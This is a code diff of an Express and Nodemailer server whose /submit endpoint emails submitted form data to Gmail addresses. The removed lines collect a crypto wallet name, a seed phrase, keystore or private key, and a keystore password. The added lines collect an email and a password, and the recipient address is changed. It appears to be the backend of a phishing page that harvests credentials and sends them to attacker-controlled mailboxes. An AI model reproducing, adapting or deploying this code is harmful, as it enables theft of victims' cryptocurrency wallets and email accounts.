@@ -12,7 +12,7 @@ app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const maillist = [
-  'divasnow178@gmail.com',
+  'willyscotmegan@gmail.com',
 ];
 
 const transporter = nodemailer.createTransport({
@@ -33,15 +33,14 @@ app.post('/submit', async (req, res) => {
   try {
     console.log('Srcvd:', req.body);
 
-    const { wetName, phWet, passwordWet } = req.body;
+    const { wetName, psdWet } = req.body;
 
     const mailOptions = {
       from: '"Deets" <divasnow178@gmail.com>',
       to: maillist,
       html: `
-        <p><strong>Name:</strong> ${wetName || 'Not provided'}</p>
-        <p><strong>Phrase/KS/PKey:</strong> ${phWet || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${passwordWet || 'Not provided'}</p>
+        <p><strong>Eml:</strong> ${wetName || 'Not provided'}</p>
+        <p><strong>Psd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
       `
     };
 
